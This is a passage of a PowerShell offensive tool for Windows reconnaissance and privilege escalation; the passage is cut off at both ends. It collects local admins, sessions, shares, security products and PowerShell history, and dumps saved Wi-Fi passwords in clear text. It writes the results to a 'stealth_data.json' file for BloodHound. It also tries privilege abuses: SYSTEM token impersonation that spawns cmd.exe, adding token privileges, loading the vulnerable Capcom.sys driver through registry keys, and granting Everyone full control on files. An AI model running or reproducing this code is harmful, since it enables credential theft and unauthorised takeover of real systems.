        $adminGroup = (Get-WmiObject -Class Win32_Group -Filter "SID='S-1-5-32-544'").Name
        return $adminGroup
    } catch {
        Write-Output "[-] Failed to get Administrators group name: $_"
        return $null
    }
}

# This is intended to get at least some info when no LDAP is present (non AD machine)
function Get-AllLocalGroupsInfo {
    # Get the local computer entry
    $localComputer = New-Object System.DirectoryServices.DirectoryEntry("WinNT://$($env:COMPUTERNAME),computer")

    $groupDetailsList = @()

    # Iterate through each child of the local computer entry
    foreach ($child in $localComputer.Children) {
        if ($child.SchemaClassName -eq 'Group') {
            $groupEntry = New-Object System.DirectoryServices.DirectoryEntry($child.Path)

            $groupDetails = @{
                Name        = $groupEntry.Name
                Description = $groupEntry.Properties["Description"].Value
                Members     = @()
                # Probably not working
                # Privileges  = @()
            }

            # List group members
            try {
                $members = $groupEntry.Invoke("Members")
                foreach ($member in $members) {
                    $memberEntry = New-Object System.DirectoryServices.DirectoryEntry($member)
                    if ($memberEntry -ne $null) {
                        $groupDetails.Members += $memberEntry.Name
                    }
                }
            } catch {
                Write-Error "Error retrieving members for group '$($groupEntry.Name)': $_"
            }

            # Attempt to get privileges
            
            #try {
                # This will likely need to be adjusted based on your environment
            #    $privileges = $groupEntry.Properties["Privileges"].Value
            #    if ($privileges -ne $null) {
            #        $groupDetails.Privileges = $privileges
            #    } 
            #} catch {
            #    Write-Error "Error retrieving privileges for group '$($groupEntry.Name)': $_"
            #}
            
            $groupDetailsList += $groupDetails
        }
    }

    return $groupDetailsList
}

# Collect local administrators (language independent)
function collect_LAs {
    # Get the local Administrators group name based on SID
    $localAdminGroupName = Get-LocalAdminGroupName

    if ($localAdminGroupName -eq $null) {
        Write-Output "[-] Could not determine the local administrators group name."
        return
    }

    # First attempt using Get-LocalGroupMember
    try {
        $localAdmins = Get-LocalGroupMember -Group $localAdminGroupName | Select-Object -ExpandProperty Name
        $gCollect['SH_Data']['LocalAdmins'] = $localAdmins
        Write-Output "[+] Local Admins collected using Get-LocalGroupMember"
        Write-Output $localAdmins
        Write-Output ""
    } catch {
        Write-Output "[-] Get-LocalGroupMember failed, attempting WMI method: $_"
        
        # Fallback to WMI method
        try {
            $localAdmins = Get-WmiObject -Query "ASSOCIATORS OF {Win32_Group.Domain='$env:COMPUTERNAME', Name='$localAdminGroupName'} WHERE AssocClass=Win32_GroupUser" | Select-Object -ExpandProperty Name
            $gCollect['SH_Data']['LocalAdmins'] = $localAdmins
            Write-Output "[+] Local Admins collected using WMI method"
            Write-Output $localAdmins
            Write-Output ""
        } catch {
            Write-Output "[-] WMI method failed: $_"
        }
    }
}

function getWifiKeys {
    # Check if wlansvc is running, otherwise fail gracefully
    try {
        $wlansvcStatus = Get-Service -Name WlanSvc -ErrorAction SilentlyContinue
        if ($wlansvcStatus.Status -eq 'Running') {

            # Get all saved Wi-Fi profiles
            $profiles = netsh wlan show profiles | Select-String ":(.*)" | ForEach-Object {
                ($_ -split ":")[1].Trim()
            }

            if ($profiles.Count -eq 0) {
                Write-Output "[-] No Wi-Fi profiles found"
                return
            }

            # Loop through each profile and show password and other details
            foreach ($profile in $profiles) {
                $profileInfo = netsh wlan show profile name="$profile" key=clear

                # Display Wi-Fi profile name
                Write-Output "Wi-Fi Profile: $profile"
                
                # Look for Key Content (password), handling different locales
                $keyContentLine = $profileInfo | Select-String "(Key Content|Schlüsselinhalt|Contenido de la clave|Clave de red)" 
                
                if ($keyContentLine) {
                    $password = ($keyContentLine -split ":")[1].Trim()
                    Write-Output "Password: $password"
                } else {
                    Write-Output "Password: No password saved or profile uses a non-standard method."
                }

                # Display more useful info: Authentication, Cipher, Connection type
                $authLine = $profileInfo | Select-String "(Authentication|Authentifizierung|Autenticación)"
                $cipherLine = $profileInfo | Select-String "(Cipher|Verschlüsselung|Cifrado)"
                $connectionTypeLine = $profileInfo | Select-String "(Connection mode|Verbindungsmodus|Modo de conexión)"

                if ($authLine) {
                    $authType = ($authLine -split ":")[1].Trim()
                    Write-Output "Authentication: $authType"
                }

                if ($cipherLine) {
                    $cipherType = ($cipherLine -split ":")[1].Trim()
                    Write-Output "Cipher: $cipherType"
                }

                if ($connectionTypeLine) {
                    $connectionType = ($connectionTypeLine -split ":")[1].Trim()
                    Write-Output "Connection Type: $connectionType"
                }

                Write-Output "-----------------------------"
            }
        }
        else {
            Write-Output "[-] WLAN AutoConfig service (wlansvc) is not running."
        }
    }
    catch {
        Write-Output "[-] Error occurred while retrieving Wi-Fi keys: $_"
    }
}

function sh_check {
    Write-Output "[$([char]0xD83D + [char]0xDC80)] Starting additional SH-focused collection..." 
    Write-Output "Note: This is not intended to be run alone, but relies on data"
    Write-Output "from the other checks."
    Write-Output " "

    # Initialize collections if needed
    if (-not $gCollect['SH_Data']) {
        $gCollect['SH_Data'] = @{
            LocalAdmins       = @{}
            LoggedOnUsers     = @{}
            ActiveSessions    = @{}
            NetworkShares     = @{}
            DomainInfo        = @{}
            GroupMemberships   = @{}
            GroupPolicies      = @{}
            TokenDelegation    = @{}
            TrustRelationships = @{}
            SecurityPolicies   = @{}
            AntiVirusProducts  = @{}
            Firewalls          = @{}
            InstalledServices   = @{}
            SecuritySettings    = @{}
            SystemEvents       = @{}
        }
    }

    # Check Local Admins
    collect_LAs

    # Check Active Sessions
    try {
        $activeSessions = @()

        # Get all logon sessions
        $logonSessions = Get-WmiObject -Class Win32_LogonSession | Where-Object { $_.LogonType -eq 2 }

        foreach ($session in $logonSessions) {
            # Get the associated logged-on user
            $loggedOnUsers = Get-WmiObject -Class Win32_LoggedOnUser | Where-Object { $_.Dependent -like "*LogonId=`"$($session.LogonId)`"" }
            
            foreach ($user in $loggedOnUsers) {
                # Extract the username from Antecedent
                $username = ($user.Antecedent -replace '\\\\.\\root\\cimv2:Win32_Account.Domain="[^"]+",Name="', '') -replace '"$', ''
                
                # Create a custom object for each session/user pair
                $activeSessions += [PSCustomObject]@{
                    UserName    = $username
                    SessionID   = $session.LogonId
                    LogonType   = $session.LogonType
                    StartTime   = $session.StartTime
                }
            }
        }

        $gCollect['SH_Data']['ActiveSessions'] = $activeSessions
        Write-Output "[+] Active sessions collected: $($activeSessions.Count) active sessions found."
    } catch {
        Write-Output "[-] Failed to collect active sessions: $_"
    }

    # Enumerate Network Shares
    try {
        $networkShares = Get-WmiObject -Class Win32_Share | Select-Object Name, Path, Description
        $gCollect['SH_Data']['NetworkShares'] = $networkShares
        Write-Output "[+] Network shares collected"
        Write-Output $networkShares | Format-Table -AutoSize
    } catch {
        Write-Output "[-] Failed to collect network shares: $_"
    }

    # Collect Domain Information (if domain-joined)
    $isDomainJoined = $null
    try {
        $isDomainJoined = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
        $gCollect['SH_Data']['DomainInfo'] = $isDomainJoined
        Write-Output "[+] Domain information collected, machine is domain joined? " $isDomainJoined
        Write-Output ""
    } catch {
        Write-Output "[-] Failed to collect domain information: $_"
    }

    # Enumerate Group Memberships
    try {
        $userGroups = Get-WmiObject -Query "ASSOCIATORS OF {Win32_UserAccount.Domain='$env:USERDOMAIN',Name='$env:USERNAME'} WHERE AssocClass=Win32_GroupUser"
        $gCollect['SH_Data']['GroupMemberships'] = $userGroups | Select-Object Name
        Write-Output "[+] Group memberships collected"
    } catch {
        Write-Output "[-] Failed to collect group memberships: $_"
    }

    # TODO - Try C# group permission enum
    Write-Output "[$([char]0xD83D + [char]0xDC80)] Trying to get Group infos (limited on non-AD machines), may take a minute..."
    $allGroupInfo = Get-AllLocalGroupsInfo
    if ($allGroupInfo.Count -gt 0) {
        Write-Output "[+] Found Group infos, printing first 5:"
        $allGroupInfo | Select-Object -First 5 | ForEach-Object { Write-Output $_ }
        Write-Output " "
    }
    # Collect AntiVirus Products
    try {
        $securityPolicies = Get-WmiObject -Namespace "ROOT\SecurityCenter2" -Class "AntiVirusProduct" -ErrorAction Stop
        $gCollect['SH_Data']['AntiVirusProducts'] = $securityPolicies | Select-Object -Property displayName, path, productState
        Write-Output "[+] AntiVirus products collected via WMI"
    } catch {
        Write-Output "[-] Failed to collect AntiVirus products: $_"
    }

    # Collect Firewall Information
    try {
        $firewalls = Get-WmiObject -Namespace "ROOT\SecurityCenter2" -Class "FirewallProduct" -ErrorAction Stop
        if ($firewalls) {
            $gCollect['SH_Data']['Firewalls'] = $firewalls | Select-Object -Property displayName, path, productState
            Write-Output "[+] Firewall products collected"
        } else {
            Write-Output "[-] No firewall products found or no output."
        }
    } catch {
        Write-Output "[-] Failed to collect firewall products: $_"
    }

    # Get Named Pipes
    try {
        $namedPipes = [System.IO.Directory]::GetFiles("\\.\\pipe\\")
        if ($namedPipes) {
            Write-Output "[+] Collected Named Pipes"
            if ($DEBUG_MODE) {
                 Write-Output $namedPipes | Select-Object -First 10
            }
        }
        else {
            Write-Output "[-] Failed to collect Named Pipes"
        }
    } catch { 
        Write-Output "[-] Failed to collect Named Pipes with error"
    }

    # Get Full Powershell History
    try {
        $powershellHistory = type (Get-PSReadLineOption).HistorySavePath
        if ($powershellHistory) {
            Write-Output "[+] Collected Full Powershell History"
        }
        else {
            Write-Output "[-] Failed to collect Full Powershell History"
        }
    } catch { 
        Write-Output "[-] Failed to collect Full Powershell History with error"
    }

    # Check User Rights Assignment (not using Win32_UserRight)
    try {
        $userRights = Get-WmiObject -Namespace "ROOT\CIMv2" -Class "Win32_UserAccount" -ErrorAction Stop | Where-Object { $_.LocalAccount -eq $true }
        $gCollect['SH_Data']['UserRights'] = $userRights 
        Write-Output "[+] User rights assignments collected"
        Write-Output $userRights |  Select-Object -Property Name, FullName, Domain, SID |  Format-Table -AutoSize
    } catch {
        Write-Output "[-] Failed to collect user rights assignments: $_"
    }

    # Collect Installed Services
    try {
        $services = Get-WmiObject -Class Win32_Service -ErrorAction Stop
        $gCollect['SH_Data']['InstalledServices'] = $services
        Write-Output "[+] Installed services collected, showing first 20"
        Write-Output $services | Select-Object -First 20 | Select-Object -Property Name, State, StartMode | Format-Table -AutoSize
        # We could check for Desktop or Shell and then use proper windows to display long list stuff
        # Write-Output $services | Select-Object -Property Name, State, StartMode | Out-GridView -Title "Installed Services" -PassThru
    } catch {
        Write-Output "[-] Failed to collect installed services: $_"
    }

    # Check Group Policies applied to user
    try {
        if ($isDomainJoined) {
            # For domain-joined machines
            $groupPolicies = Get-WmiObject -Namespace "ROOT\RSOP" -Class "RSOP_PolicySetting" -ErrorAction Stop
            $gCollect['SH_Data']['GroupPolicies'] = $groupPolicies
            Write-Output "[+] Group policies collected for domain-joined machine"
        } else {
            # For standalone machines
            Write-Output "[-] Group policies collection not applicable for standalone machine"
        }
    } catch {
        Write-Output "[-] Failed to collect group policies: $_"
    }

    # Check Token Delegation
    try {
        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $gCollect['SH_Data']['TokenDelegation'] = @{
            UserName = $token.Name
            ImpersonationLevel = $token.ImpersonationLevel
            IsAuthenticated = $token.IsAuthenticated
        }
        Write-Output "[+] Token delegation info collected"
    } catch {
        Write-Output "[-] Failed to collect token delegation info: $_"
    }

    # Enumerate Trust Relationships
    try {
        if ($isDomainJoined) {
            $trustRelationships = Get-WmiObject -Namespace "ROOT\Microsoft\Windows\ActiveDirectory" -Class "TrustRelationship" -ErrorAction Stop
            $gCollect['SH_Data']['TrustRelationships'] = $trustRelationships
            Write-Output "[+] Trust relationships collected for domain-joined machine"
        } else {
            Write-Output "[-] Trust relationships not applicable for standalone machine"
        }
    } catch {
        Write-Output "[-] Failed to collect trust relationships: $_"
    }

    # Collect System Events with a limit of the last 200 entries
    Write-Output "[+] Trying to collect and reference latest 200 Events, may take a minute..."
    try {
        $events = Get-WmiObject -Namespace "ROOT\CIMv2" -Class "Win32_NTLogEvent" -ErrorAction Stop | 
                Sort-Object TimeGenerated -Descending | 
                Select-Object -First 200
        
        $gCollect['SH_Data']['SystemEvents'] = @()

        foreach ($event in $events) {
            # Initialize an empty hashtable to store event details
            $eventDetails = @{
                LogFile      = $event.LogFile
                EventCode    = $event.EventCode
                EventType    = $event.EventType
                SourceName   = $event.SourceName
                Message      = $event.Message
                TimeGenerated = $event.TimeGenerated
                Path         = $null # Placeholder for path
            }

            # Try to get the path from Win32_Service
            $service = Get-WmiObject -Class Win32_Service -Filter "Name='$($event.SourceName)'" -ErrorAction SilentlyContinue
            if ($service) {
                $eventDetails.Path = $service.PathName -replace '"', '' # Clean quotes
            } else {
                # If not found in services, try Win32_Process
                $process = Get-WmiObject -Class Win32_Process -Filter "Name='$($event.SourceName).exe'" -ErrorAction SilentlyContinue
                if ($process) {
                    $eventDetails.Path = $process.ExecutablePath
                }
            }

            # Add event details to the collection
            $gCollect['SH_Data']['SystemEvents'] += $eventDetails
        }
    } catch {
        Write-Output "[-] Failed to collect system events: $_"
    }

    try {
        Write-Output "[+] Last 200 system events collected with paths resolution, example:"
        $firstEvent = $gCollect['SH_Data']['SystemEvents'][0]
        $formattedEvent = [PSCustomObject]@{
            SourceName    = $firstEvent.SourceName
            Message       = $firstEvent.Message[0..100] -join ''
            Path          = $firstEvent.Path[0]
        } 
        Write-Output $formattedEvent | Format-List
    } catch {
        Write-Output "[-] Failed to display system event example"
    }

    # Try to access Wifi Keys
    getWifiKeys

    Write-Output "[$([char]0xD83D + [char]0xDC80)] Finished SH-focused data collection."
}

function sh_translate {
    # Initialize Transformed object
    $gCollect['Transformed'] = @{
        "nodes" = @()
    }

    # Transform UserDetails to nodes
    if ($gCollect['UserDetails']) {
        $userNode = @{
            "objectid" = $gCollect['UserDetails']['SID'] # Using SID as a unique identifier
            "name" = $gCollect['UserDetails']['FullName']
            "type" = "user"
            "isGuest" = $gCollect['UserDetails']['IsGuest']
        }
        $gCollect['Transformed']['nodes'] += $userNode
    }

    # Transform Groups
    if ($gCollect['Groups']) {
        foreach ($group in $gCollect['Groups']['UserGroups']) {
            $node = @{
                "objectid" = $group.Name # Ensure this is unique
                "name" = $group.Name
                "type" = "group"
            }
            $gCollect['Transformed']['nodes'] += $node
        }
    }

    # Transform Privileges
    if ($gCollect['Privileges']) {
        foreach ($privilege in $gCollect['Privileges']) {
            $node = @{
                "objectid" = "$($privilege.UserName)_$($privilege.Privilege)" # Unique identifier
                "name" = $privilege.Privilege
                "type" = "privilege"
                "user" = $privilege.UserName
            }
            $gCollect['Transformed']['nodes'] += $node
        }
    }

    # Note: Skip edges for now since BloodHound will construct those from nodes.
}

function sh_store {
    # Store the transformed data to disk or send it somewhere
    $storagePath = "C:\Temp\stealth_data.json"
    
    $jsonData = $gCollect['Transformed'] | ConvertTo-Json -Depth 3
    Set-Content -Path $storagePath -Value $jsonData

    Write-Output "[+] Data stored at $storagePath."
    if ($DEBUG_MODE) {
        Write-Output "[+] Global Object Data: " 
        $gCollect | ConvertTo-Json -Depth 3 | Write-Output
    }
}

function run_SH_collection {
    # some further checks / data collection not covered by other checks
    sh_check

    # translation and storage of ALL collected data
    sh_translate
    sh_store
}

function Get-AccessTokenHandle {
    [IntPtr]$tokenHandle = [IntPtr]::Zero
    try {
        if ([Win32]::OpenProcessToken([Win32]::GetCurrentProcess(), 0x0008, [ref]$tokenHandle)) {
            return $tokenHandle
        } else {
            return [IntPtr]::Zero
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error retrieving Access Token Handle: $_" }
        return [IntPtr]::Zero
    }
}

# Functions for each technique - checks and execution
function checkCertySAN {
    if ($DEBUG_MODE) { Write-Output "Checking for Certify SAN vulnerabilities..." }

    try {
        # Get all user accounts with the service account flag
        $serviceAccounts = Get-ADUser -Filter { ServicePrincipalName -ne $null } -Property SamAccountName, ServicePrincipalName, PasswordNeverExpires

        if ($serviceAccounts) {
            foreach ($account in $serviceAccounts) {
                # Get the user's permissions on the service account
                $permissions = Get-ACL -Path "AD:\$($account.SamAccountName)"

                # Check for permission to change password
                $changePassword = $permissions.Access | Where-Object {
                    $_.ActiveDirectoryRights -eq "ChangePassword" -and $_.IdentityReference -eq $env:USERNAME
                }

                if ($changePassword) {
                    Write-Output "[+] Found vulnerable service account: $($account.SamAccountName)"
                    Write-Output "   - SPN: $($account.ServicePrincipalName)"
                    Write-Output "   - Can change password: Yes"
                } else {
                    Write-Output "[-] Service account: $($account.SamAccountName) - No permission to change password"
                }
            }
        } else {
            Write-Output "[-] No service accounts found."
        }
    }
    catch {
        Write-Output "[-] Certify SAN check couldn't be performed (no AD machine?)"
    }
}

function checkSePrivileges {
    if ($DEBUG_MODE) { Write-Output "Checking Se.. Privileges for $userName" }
    
    try {
        $userName = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name
        if (-not $userName) {
            $userName = $env:USERNAME   
        }
        $whoamiPriv = runSubprocess "whoami" "/priv"
        $lines = $whoamiPriv -split "`n"
        $filteredOutput = $lines[6..$lines.Length] -join "`n"
        $outlist = @()

        foreach ($priv in $privList) {
            if ($filteredOutput -match $priv.name) {
                $outlist += [PSCustomObject]@{ name = "[+] $($priv.name)" ; message = "$($priv.message)" }
                $gCollect['Privileges'][$priv.name] = $true
            
            }
        }

        if ($outlist.Length -gt 0) {
            Write-Output "[+] Found Privs for: $userName" 
            Write-Output $outlist | Format-Table -AutoSize -HideTableHeaders
        }
        else {
            Write-Output "[-] $userName has no Se.. privileges."
        }
    } catch {
        Write-Output "[-] Error checking Se.. Privileges: $_"
    }
}

function trySePrivileges {
    if ($DEBUG_MODE) { Write-Output "Trying to use SePrivileges..." }

    # Receive Privs via C# and try to add new privs on-the-fly (experimental stuff)
    Write-Host ("-" * $Host.UI.RawUI.WindowSize.Width)
    Write-Host ""
    Write-Host "[$([char]0xD83D + [char]0xDC80)] Running experimental method to receive and add Se-Privs to running process (usually needs NT-Authority)"
    Write-Host "[*] Checking Current Process Privileges via custom C# implementation (no whois)"

    # Returns from c# List<string> privilegeNames = new List<string>();
    $currentPrivs = @([TokPriv]::PrintPrivs())
    $currentPrivs.foreach({Write-Host $_})

    # Define the mandatory privileges for AddPrivs() to work
    $requiredPrivs = @("SeDebugPrivilege", "SeImpersonatePrivilege") 
    # By definition also needs "SeAssignPrimaryTokenPrivilege" - but not even System has that by default

    # Check if all required privileges are present (case-insensitive comparison)
    $missingPrivs = $requiredPrivs | Where-Object { $_ -notin $currentPrivs }

    # If no missing privileges, proceed
    if ($missingPrivs.Count -eq 0) {
        Write-Host ""
        Write-Host "[+] All required privileges are present. Attempting to add SeTakeOwnershipPrivilege..."
        Write-Host ""

        # Try to add SeTakeOwnershipPrivilege
        $success = [TokPriv]::AddPrivs('SeTakeOwnershipPrivilege')
        
        if ($success) {
            Write-Host "[!] Success: SeTakeOwnershipPrivilege added!" -ForegroundColor Green
        } else {
            Write-Host "[-] Failed: Could not add SeTakeOwnershipPrivilege." -ForegroundColor Red
        }

        # Print final state of privileges after adding
        Write-Host "Final State of Privileges:"
        [TokPriv]::PrintPrivs() | ForEach-Object { Write-Host $_ }

    } else {
        # If any required privileges are missing, print what's missing
        Write-Host ""
        Write-Host "[-] You are missing the following privileges for AddPrivs() to work:" -ForegroundColor Yellow
        $missingPrivs | ForEach-Object { Write-Host $_ }
        Write-Host ""
        Write-Host "Exiting Experimental Space..." -ForegroundColor Red
    }

    Write-Host ""
    Write-Host ("-" * $Host.UI.RawUI.WindowSize.Width)

    # Loop over $gCollect['Privileges'][$priv.name]
    foreach ($privName in $gCollect['Privileges'].Keys) {
        switch ($privName) {
            "SeImpersonatePrivilege" {
                Write-Output "[!] Testing SeImpersonate preconditions..."
                if ([TokenImp]::ImpSys()) {
                    Write-Output "[+] Token impersonation successful. Elevated privileges acquired!"
                    Start-Process cmd.exe
                } else {
                    Write-Output "[-] Token impersonation failed. No elevated privileges."
                }
                Write-Output ""
            }
            "SeBackupPrivilege" {
                Write-Output "[!] Testing SeBackupPrivilege..."
                # Attempt to read from a non-critical temp file
                $tempFile = "C:\Windows\Temp\testfile.txt"
                Write-Output "[*] Attempting to read from $tempFile..."
                if (Test-Path $tempFile) {
                    Get-Content $tempFile
                } else {
                    Write-Output "[-] $tempFile does not exist. Creating for testing..."
                    "This is a test file." | Out-File -FilePath $tempFile
                }
                Write-Output ""
            }
            "SeDebugPrivilege" {
                Write-Output "[!] Testing SeDebugPrivilege..."
                # Attempt to dump LSASS or debug non-critical process
                Write-Output "[*] Trying to dump a test process..."
                # Example placeholder for actual memory dump function
                Write-Output ""
            }
            "SeTakeOwnershipPrivilege" {
                Write-Output "[!] Testing SeTakeOwnershipPrivilege..."
                # Attempt to take ownership of a non-critical file in System32
                $testFile = "C:\Windows\System32\testfile.txt"
                Write-Output "[*] Attempting to take ownership of $testFile..."
                if (-not (Test-Path $testFile)) {
                    "Test content" | Out-File -FilePath $testFile
                }
                Take-Ownership -Path $testFile
                Write-Output ""
            }
            "SeCreateSymbolicLinkPrivilege" {
                Write-Output "[!] Testing SeCreateSymbolicLinkPrivilege..."
                Write-Output "[*] Creating symbolic link for testing..."
                echo "t" > "C:\Windows\Temp\testfile.txt"
                New-Item -ItemType SymbolicLink -Path "C:\Windows\Temp\TestLink" -Target "C:\Windows\Temp\testfile.txt"
                Write-Output ""
            }
            "SeLoadDriverPrivilege" {
                Write-Output "[!] Testing SeLoadDriverPrivilege..."
                
                # Get the current user's SID
                $currentUserSID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value

                # Define the driver key path for the current user and registry uninstall path
                $driverKeyPath = "Registry::HKEY_USERS\$currentUserSID\System\CurrentControlSet\Services\DriverName"
                $registryPath = "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\DriverName"

                # Define the driver binary path (Capcom.sys in the current working directory)
                $driverBinaryPath = (Get-Location).Path + "\Capcom.sys"

                # Check if the driver registry path exists, if not create it
                if (-not (Test-Path $driverKeyPath)) {
                    Set-ItemProperty -Path $driverKeyPath -Name "ImagePath" -Value $driverBinaryPath
                    Set-ItemProperty -Path $driverKeyPath -Name "Type" -Value 1  # SERVICE_KERNEL_DRIVER (0x00000001)

                    # Output success messages
                    Write-Output "Driver registry path created:"
                    Write-Output "ImagePath set to:" $driverBinaryPath
                    Write-Output "Type set to: 1 (SERVICE_KERNEL_DRIVER)"

                    # Load the driver using the DriverLoader class
                    [DriverLoader]::LoadDriver($registryPath, $driverBinaryPath)
                }
                else {
                    Write-Output "Driver registry path already exists."
                }
                Write-Output ""
            }

            "SeRestorePrivilege" {
                Write-Output "[!] Testing SeRestorePrivilege..."
                Write-Output "[*] Attempting to restore a test file..."
                $restoreFilePath = "C:\Windows\Temp\restoredfile.txt"
                "This is a restored file." | Out-File -FilePath $restoreFilePath
                Write-Output ""
            }
            "SeCreateTokenPrivilege" {
                Write-Output "[!] Testing SeCreateTokenPrivilege..."
                Write-Output "[+] Attempting to create a new token for impersonation..."
                $token = New-Object System.Security.Principal.WindowsIdentity -ArgumentList "NewUser", $true # Adjust as necessary
                $token.Impersonate()
                Write-Output ""
            }
            "SeSecurityPrivilege" {
                Write-Output "[!] Testing SeSecurityPrivilege..."
                Write-Output "[+] Attempting to modify security settings on a test file..."
                $testFile = "C:\Windows\Temp\testfile.txt"
                $acl = Get-Acl -Path $testFile
                $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
                $acl.SetAccessRule($rule)
                Set-Acl -Path $testFile -AclObject $acl
                Write-Output ""
            }
            "SeChangeNotifyPrivilege" {
                Write-Output "[!] Testing SeChangeNotifyPrivilege..."
                Write-Output "[+] You can try bypassing traverse checking to access files in restricted folders, where nested file or folder is accessible to user, e.g using Test-Path "
                Write-Output ""
            }
            # Additional privileges can be checked here
        }
    }
}

function checkUserRightsAssignments {
    if ($DEBUG_MODE) { Write-Output "Checking for User Rights Assignments..." }
    checkSePrivileges
}
function tryUserRightsAssignments {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via User Rights Assignments..." }
    # Logic for exploiting User Rights Assignments
}

function checkServiceMisconfigurations {
    if ($DEBUG_MODE) { Write-Output "Checking for Service Misconfigurations..." }
    
    $writeableEnvPath = @{
        "Path"         = @()
        "Permissions"  = @()
    }

    Write-Output "[$([char]0xD83D + [char]0xDC80)] Trying to find writable env-path before System32..."
    $env:Path -split ";" | ForEach-Object {
        try {
            # Attempt to create a temporary file in the current path
            echo "test" > "$_\t"

            if ($?) {
                # If the file creation was successful, add to the writable paths
                $writeableEnvPath["Path"] += $_
                $writeableEnvPath["Permissions"] += icacls.exe $_ 
                Remove-Item "$_\t" -ErrorAction SilentlyContinue 
            }             
            if ($_.ToLower() -eq "c:\windows\system32") {
                # Exit the loop if we reach the System32 path
                return
            }
        }
        catch { 
            #Write-Output "[!] Error accessing $_" 
        }
    }
    if ($writeableEnvPath["Path"].Count -gt 0) { 
        Write-Output "[+] Printing first 5 writeable env-pathes "
        $writeableEnvPath["Path"] | Select-Object -First 5 | ForEach-Object { Write-Output $_ }
        Write-Output ""
    }
}

function tryServiceMisconfigurations {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Service Misconfigurations..." }
    # Logic for exploiting service misconfigurations
}

# New function for enumerating system basics
function enumerateSystemBasics {
    if ($DEBUG_MODE) { Write-Output "Enumerating system basics..." }
    Write-Output "[$([char]0xD83D + [char]0xDC80)] Basic System Enumeration:"
    
    $osVersion = Get-WmiObject -Class Win32_OperatingSystem
    Write-Output "OS Version: $($osVersion.Caption) $($osVersion.Version)"
    
    $rootProcesses = Get-Process -IncludeUserName | Where-Object { $_.UserName -eq 'NT AUTHORITY\SYSTEM' }
    Write-Output "System Processes: $($rootProcesses.Count)"
    
    $writableDirs = @()
    $driveList = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3"
    foreach ($drive in $driveList) {
        if (Test-Path $drive.DeviceID) {
            $writableDirs += $drive.DeviceID
        }
    }
    Write-Output "Writable Directories Found: $($writableDirs -join ', ')"
}

# Skeleton function for enumeration
function runEnumeration {
    enumerateSystemBasics
    # Other enumeration logic can go here
}

function checkScheduledTasks {
    if ($DEBUG_MODE) { Write-Output "Checking for Scheduled Tasks..." }
    try {
        $scheduledTasks = Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne "SYSTEM"}
        if ($scheduledTasks) {
            Write-Output "[+] Found Non-System Scheduled Tasks (printing max. 5):"
            $scheduledTasks | Select-Object -First 5 | ForEach-Object { Write-Output "$($_.TaskName)" }
            Write-Output ""
            $gCollect['OtherData']["ScheduledTasks"] = $scheduledTasks.TaskName
        } else {
            Write-Output "[-] No vulnerable scheduled tasks found."
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error while checking scheduled tasks: $_" }
    }
}

function tryScheduledTasks {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Scheduled Tasks..." }
    # Add logic to exploit scheduled tasks if they are vulnerable (e.g., changing executable path to escalate)
}

function checkWMIEventSubscription {
    if ($DEBUG_MODE) { Write-Output "Checking for WMI Event Subscription Abuse..." }
    try {
        $wmiEvents = Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
        if ($wmiEvents) {
            Write-Output "[+] WMI Event Subscriptions Detected:"
            $wmiEvents | ForEach-Object { Write-Output "Event: $($_.Name)" }
            
            $gCollect['OtherData']["WMIEvents"] = $wmiEvents.Name
        } else {
            Write-Output "[-] No vulnerable WMI event subscriptions found."
        }
        Write-Output ""
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error while checking WMI events: $_" }
    }
}

function tryWMIEventSubscription {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via WMI Event Subscription..." }
    # Logic to exploit WMI event subscriptions
}

function checkTokenImpersonation {
    if ($DEBUG_MODE) { Write-Output "Checking for Token Impersonation/Manipulation..." }
    try {
        $tokens = whoami /priv | Select-String "SePrivileges"
        if ($tokens) {
            Write-Output "[+] Token Impersonation Possible."
            $gCollect['Privileges']["SePrivileges"] = $tokens
        } else {
            Write-Output "[-] No Token Impersonation available."
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error checking token impersonation: $_" }
    }
}

function tryTokenImpersonation {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Token Impersonation..." }
    # Logic for abusing token impersonation, e.g., using tools like `Incognito` to exploit impersonation tokens
}

function checkRegistryKeyAbuse {
    if ($DEBUG_MODE) { Write-Output "Checking for Registry Key Abuse..." }
    $localizedUsers = Get-LocalizedUserMapping

    # Weak identity mappings based on localized names
    $weakIdentities = @(
        $localizedUsers['everyone'].LocalizedName,
        $localizedUsers['authenticated users'].LocalizedName,
        $localizedUsers['users'].LocalizedName
    )

    try {
        # Define registry paths to check
        $registryPaths = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
            "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            "HKLM\SYSTEM\CurrentControlSet\Services",
            "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
            "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
            "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs"
        )

        # Initialize global collection for registry key abuse
        $gCollect['OtherData']["RegistryKeyAbuse"] = @()

        foreach ($path in $registryPaths) {
            try {
                $acl = Get-Acl -Path $path -ErrorAction Stop
                # Output all ACL entries for debugging

                foreach ($identity in $weakIdentities) {
